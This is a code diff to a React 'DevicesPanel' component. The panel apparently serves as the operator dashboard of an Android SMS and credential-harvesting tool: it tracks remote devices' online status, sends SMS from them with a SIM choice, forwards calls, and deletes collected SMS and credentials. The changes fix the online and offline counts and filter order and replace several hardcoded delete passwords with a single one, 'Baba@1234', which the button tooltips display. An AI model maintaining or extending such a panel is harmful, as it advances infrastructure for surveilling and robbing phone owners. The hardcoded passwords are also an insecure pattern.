@@ -23,7 +23,7 @@ export default function DevicesPanel({
   const [expandedDevices, setExpandedDevices] = useState({});
   const [activeTabs, setActiveTabs] = useState({});
 
-  // Permanent Storage - SMS & Call Forward data send hone ke baad bhi nahi hatega
+  // Permanent Storage
   const [smsPhone, setSmsPhone] = useState("");
   const [smsBody, setSmsBody] = useState("");
   const [simChoice, setSimChoice] = useState({});
@@ -93,17 +93,29 @@ export default function DevicesPanel({
   const devices = data.user_data || {};
   const deviceStatus = data.device_status || {};
 
-  let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));
+  let allKeys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));
 
   if (searchQuery) {
     const q = searchQuery.toLowerCase();
-    keys = keys.filter(id => {
+    allKeys = allKeys.filter(id => {
       const dev = devices[id] || {};
       const status = deviceStatus[id] || {};
       const name = status.device_name || dev.d_name || dev.Device_info || id;
       const serial = deviceSerialMap[id] || 0;
       return (id + " " + name + " " + serial).toLowerCase().includes(q);
     });
+  }
+
+  // Calculate accurate online and offline count for active search/list
+  const onlineCount = allKeys.filter(id => Boolean(deviceOnlineStatus[id])).length;
+  const offlineCount = allKeys.length - onlineCount;
+
+  // Apply tab filter
+  let keys = [...allKeys];
+  if (filter === "online") {
+    keys = keys.filter(id => Boolean(deviceOnlineStatus[id]));
+  } else if (filter === "offline") {
+    keys = keys.filter(id => !deviceOnlineStatus[id]);
   }
 
   keys.sort((a, b) => {
@@ -114,12 +126,6 @@ export default function DevicesPanel({
     const sB = deviceSerialMap[b] || 0;
     return sB - sA;
   });
-
-  if (filter === "online") {
-    keys = keys.filter(id => deviceOnlineStatus[id] === true);
-  } else if (filter === "offline") {
-    keys = keys.filter(id => !deviceOnlineStatus[id]);
-  }
 
   const paginatedKeys = keys.slice(offset, offset + DEVICE_LIMIT);
 
@@ -212,7 +218,6 @@ export default function DevicesPanel({
     }
   };
 
-  // Card Level Data & Device Delete Handler
   const deleteDeviceData = (devId, type) => {
     let targetPwd = "9090";
     if (type === "sms") targetPwd = "1122";
@@ -235,9 +240,6 @@ export default function DevicesPanel({
     }
   };
 
-  const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
-  const offlineCount = keys.length - onlineCount;
-
   return (
     <div className="panel active">
       <div className="panel-header">
@@ -247,7 +249,7 @@ export default function DevicesPanel({
         </div>
         <div className="panel-stats">
           <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
-            All ({keys.length})
+            All ({allKeys.length})
           </button>
           <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>
             🟢 Online ({onlineCount})
@@ -276,17 +278,16 @@ export default function DevicesPanel({
 
       {/* TOP ACTION BUTTONS BAR */}
       <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
-        <button className="btn-delete-all" onClick={deleteAllSms} title="Password: 1122">
+        <button className="btn-delete-all" onClick={deleteAllSms} title="Password: Baba@1234">
           <i className="fas fa-trash-alt"></i> Delete All SMS
         </button>
-        <button className="btn-delete-all credential" onClick={deleteAllCredentials} title="Password: 3344">
+        <button className="btn-delete-all credential" onClick={deleteAllCredentials} title="Password: Baba@1234">
           <i className="fas fa-key"></i> Delete All Credentials
         </button>
-        {/* NAYA BUTTON: DELETE ALL DEVICES */}
         <button 
           className="btn-delete-all" 
           onClick={deleteAllDevices} 
-          title="Password: 5566"
+          title="Password: Baba@1234"
           style={{ background: "rgba(220, 38, 38, 0.2)", borderColor: "var(--red)" }}
         >
           <i className="fas fa-mobile-alt"></i> Delete All Devices
